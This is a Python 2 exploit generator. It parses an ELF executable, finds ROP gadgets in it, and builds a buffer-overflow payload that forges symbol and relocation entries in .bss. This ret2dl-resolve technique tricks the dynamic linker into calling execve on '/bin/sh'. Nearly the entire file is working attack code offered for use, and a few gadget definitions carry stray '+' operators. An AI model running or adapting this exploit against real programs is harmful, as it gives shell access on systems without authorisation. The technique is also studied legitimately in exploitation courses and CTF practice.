import sys
import json
import subprocess

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import P_FLAGS

ElfN_Versym_size = 2

relocation_types = {
    "EM_386": 7,
    "EM_X86_64": 7
}

writemem_gadgets = {
    "EM_386": (" 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
               " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
               " 89 10"       + # mov DWORD PTR [eax],edx \
               " c3",           # ret \
               4),
    "EM_X86_64": (" 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
                  " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
                  " 48 89 10"       + # mov QWORD PTR [rax],rdx \
                  " c3",            + # ret \
                  8)

}

cleanup_gadgets = {
    "EM_386": (" 5b" + # pop ebx \
               " 5e" + # pop esi \
               " 5f" + # pop edi \
               " 5d" + # pop ebp \
               " c3",  # ret
               4),
    "EM_X86_64": (" 5b"    + # pop    rbx \
                  " 5d"    + # pop    rbp \
                  " 41 5c" + # pop    r12 \
                  " 41 5d" + # pop    r13 \
                  " 41 5e" + # pop    r14 \
                  " 41 5f" + # pop    r15 \
                  " c3",   + # ret
                  6)
}

class Exploit:
    __slots__ = "arch", "little", "pointer_size", "bss", "dynstr", "dynsym", \
                "relplt", "plt", "writemem", "write_size", "cleanup_gadget", \
                "cleanup_size", "sip_offset", "filler", "relocation_type", \
                "gnuversion", "dynamic", "versym"
    def dump(self):
        return "\n".join([slot + ": " + str(getattr(self, slot)) for slot in self.__slots__])

    def ptr2str(self, integer):
        string = integer_to_bigendian(integer)
        if self.little:
            return string.rjust(self.pointer_size, "\x00")[::-1]
        else:
            return string.ljust(self.pointer_size, "\x00")

    def str2ptr(self, string):
        ptr = bigendian_to_integer(string)
        if self.little:
            return int("".join(reversed(list(chunks(ptr, 2)))), 16)
        else:
            return int(ptr, 16)

    def do_writemem(self, address, value):
        return self.ptr2str(getattr(self, "writemem")) + \
               self.prepare_args([address, value])

    def prepare_args(self, parameters):
        if len(parameters) > self.cleanup_size:
            raise Exception("Too many parameters, find a better gadget")

        return self.ptr2str(self.cleanup_gadget) + \
               "".join(map(str, parameters)) + \
               self.filler * (self.cleanup_size - len(parameters))

    def __init__(self, path):
        with open(path, "r") as executable_file:
            elf = ELFFile(executable_file)
            get_section = lambda name: first_or_none(filter(lambda section: section.name == name, elf.iter_sections()))

            # Binary type
            self.arch = elf.header.e_machine
            self.little = elf.little_endian
            self.pointer_size = elf.elfclass / 8
            self.pointer_format = ("0x%." + str(self.pointer_size * 2) + "x")
            self.structs = elftools.elf.structs.ELFStructs(self.little, self.pointer_size * 8)

            # Useful sections
            self.bss = get_section(".bss").header.sh_addr
            self.dynstr = get_section(".dynstr").header.sh_addr
            self.dynsym = get_section(".dynsym").header.sh_addr

            relplt_section = get_section(".rel.plt")
            self.addend = relplt_section is None
            if self.addend:
                relplt_section = get_section(".rela.plt")
            self.relplt = relplt_section.header.sh_addr

            self.plt = get_section(".plt").header.sh_addr
            self.gnuversion = get_section(".gnu.version").header.sh_addr

            # Dynamic section
            dynamic_section = get_section(".dynamic")
            self.dynamic = dynamic_section.header.sh_addr
            dynamic_entries = [self.structs.Elf_Dyn.parse(dynamic_entry)
                               for dynamic_entry in
                               chunks(dynamic_section.data(), self.structs.Elf_Dyn.sizeof())]
            versyms = filter(lambda (i, entry): entry.d_tag == "DT_VERSYM", enumerate(dynamic_entries))
            if len(versyms) > 0:
                self.versym = self.dynamic + self.structs.Elf_Dyn.sizeof() * versyms[0][0]

            # Gadgets
            writemem_gadget, self.write_size = writemem_gadgets[self.arch]
            writemem_gadget = hex_bytes(writemem_gadget)
            executable_sections = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())
            self.writemem = find_string(executable_sections, writemem_gadget)

            cleanup_gadget, self.cleanup_size = cleanup_gadgets[self.arch]
            cleanup_gadget = hex_bytes(cleanup_gadget)
            self.cleanup_gadget = find_string(executable_sections, cleanup_gadget)

            self.sip_offset = int(sys.argv[2])
            self.filler = self.ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (self.pointer_size % 4)), 0))
            self.relocation_type = relocation_types[self.arch]

        log(self.dump())
        # for slot in self.__slots__:
        #     log(slot + ": " + str(getattr(self, slot)) + "\n")

    # This method should belong to an ExecveExploit class inheriting from Exploit
    def launch(self):

        buffer = Buffer(self, self.bss)

        binsh_str = "/bin/sh\0"
        execve_str = "execve\0"

        pointer_to_null = buffer.allocate(self.pointer_size, name="pointer_to_null")
        binsh = buffer.allocate(len(binsh_str), name="binsh")

        exploit = "A" * self.sip_offset

        # Pointer to NULL
        exploit += self.write_pointer(pointer_to_null, 0)

        # /bin/sh
        exploit += self.write_string(binsh, binsh_str)

        exploit += self.jump_to(buffer, "execve")

        exploit += self.prepare_args([binsh.pointer, pointer_to_null.pointer, pointer_to_null.pointer]) + self.filler

        log(buffer.dump())

        return exploit


    def write_string(self, memory_area, string):
        string_len = len(string)
        if string_len > memory_area.size:
            raise Exception("You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, memory_area.size))

        if string_len % self.write_size != 0:
            string = string.ljust(string_len + (self.write_size - string_len % self.write_size), "\0")
            string_len = len(string)

        result = ""
        for i, part in enumerate(chunks(string, self.write_size)):
            result += self.do_writemem(self.ptr2str(memory_area.start + i * self.write_size), part)

        memory_area.content += string

        return result

    def write_pointer(self, memory_area, pointer):
        return self.write_string(memory_area, self.ptr2str(pointer))

    def jump_to(self, buffer, function_name):

        if not function_name.endswith("\0"):
            function_name += "\0"

        rel_struct = self.structs.Elf_Rela if self.addend else self.structs.Elf_Rel

        relocation_target = buffer.allocate(self.pointer_size, name="relocation_target")
        function_name_str = buffer.allocate(len(function_name), self.dynstr, 1, name="function_name_str")
        symbol = buffer.allocate(self.structs.Elf_Sym.sizeof(), self.dynsym, name="symbol")

        # Looks like 64-bit and 32-bit have different alignment for the call to _dl_fixup
        reloc_alignment = 1 if self.pointer_size * 8 == 32 else rel_struct.sizeof()
        reloc = buffer.allocate(rel_struct.sizeof(), self.relplt, reloc_alignment, name="reloc")

        exploit = ""

        # No versioning
        if self.versym:
            dynamic_versym_dynentry = self.structs.Elf_Dyn.parse("\0" * self.structs.Elf_Dyn.sizeof())
            dynamic_versym_dynentry.d_tag = "DT_VERSYM"
            dynamic_versym_dynentry.d_val = self.gnuversion - ElfN_Versym_size * symbol.index # + 2 * 2
            dynamic_versym = MemoryArea(self, self.versym, self.structs.Elf_Dyn.sizeof())
            exploit += self.write_string(dynamic_versym, self.structs.Elf_Dyn.build(dynamic_versym_dynentry))

        # String
        exploit += self.write_string(function_name_str, function_name)

        # Symbol
        function_symbol = self.structs.Elf_Sym.parse("\0" * self.structs.Elf_Sym.sizeof())
        function_symbol.st_name = function_name_str.index
        function_symbol.st_info.bind = "STB_GLOBAL"
        function_symbol.st_info.type = "STT_FUNC"

        exploit += self.write_string(symbol, self.structs.Elf_Sym.build(function_symbol))

        # Relocation
        function_reloc = rel_struct.parse("\0" * rel_struct.sizeof())
        function_reloc.r_offset = relocation_target.start
        function_reloc.r_info_type = self.relocation_type
        function_reloc.r_info_sym = symbol.index

        if self.pointer_size * 8 == 32:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 8)
        else:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 32)

        exploit += self.write_string(reloc, rel_struct.build(function_reloc))

        # Launch
        exploit += self.ptr2str(self.plt) + self.ptr2str(reloc.index)

        return exploit

def integer_to_bigendian(n):
    s = '%x' % n
    if len(s) & 1:
        s = '0' + s
    return s.decode('hex')

def bigendian_to_integer(string):
    return string.encode("hex")

class Buffer:
    def __init__(self, exploit, start):
        self.start = start
        self.current = start
        self.areas = {}
        self.exploit = exploit
    def allocate(self, size, align_to=None, alignment=None, name=None):
        result = MemoryArea(self.exploit, self.current, size, align_to, alignment)
        self.current += result.size
        if name is not None:
            self.areas[name] = result
        return result

    def dump(self):
        result = ""
        for k, v in self.areas.iteritems():
            result += "Area " + k + "\n" + "\n".join([" " * 4 + line for line in v.dump().split("\n")]) + "\n"
        return result

def log(string):
    sys.stderr.write(string + "\n")

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]


class MemoryArea:
    def __init__(self, exploit, start, size, align_to=None, alignment=None):
        self.exploit = exploit
        if align_to is not None:
            if start < align_to:
                raise Exception("Trying to align to a something which is after our buffer: aligning " + self.exploit.pointer_format % start + " to " + self.exploit.pointer_format % align_to)
            self.align_to = align_to
            self.alignment = size if (alignment is None) else alignment
            self.start = align(start, self.align_to, self.alignment)
            self.index = (self.start - self.align_to) / self.alignment
        else:
            self.alignment = 1
            self.align_to = 0
            self.start = start
            self.index = 0

        self.content = ""
        self.pointer = self.exploit.ptr2str(self.start)
        self.size = size
        self.end = self.start + self.size

    def dump(self):
        result = ""
        result += "Start: " + self.exploit.pointer_format % self.start + "\n"
        result += "Size: " + self.exploit.pointer_format % self.size + " (" + str(self.size) + ")\n"
        result += "End: " + self.exploit.pointer_format % self.end + "\n"
        result += "Base: " + self.exploit.pointer_format % self.align_to + "\n"
        result += "Alignment: " + str(self.alignment) + "\n"
        result += "Index: " + hex(self.index) + " (" + str(self.index) + ")\n"
        result += "Content:\n"
        for chunk in chunks(self.content, self.exploit.pointer_size):
            result += " " * 4 + " ".join(["%.2x" % ord(c) for c in chunk]) + " " + self.exploit.pointer_format % self.exploit.str2ptr(chunk) + "\n"
        return result

def align(address, base, of):
    offset = (address - base) % of
    return address if offset == 0 else address + of - offset

def hex_bytes(string):
    return "".join(map(lambda x: chr(int(x, 16)), filter(len, string.split(" "))))

def find_string(sections, string):
    result = [section.header.p_vaddr + section.data().index(string) for section in sections if string in section.data()]
    if len(result) == 0:
        raise Exception("Can't find gadget " + str(map(lambda char: hex(char)[2:], string)))
    return result[0]

def first_or_none(list):
    return list[0] if len(list) > 0 else None

def main():
    executable_path = sys.argv[1]
    exploit = Exploit(executable_path)
    sys.stdout.write(exploit.launch())

if __name__ == "__main__":
    main()
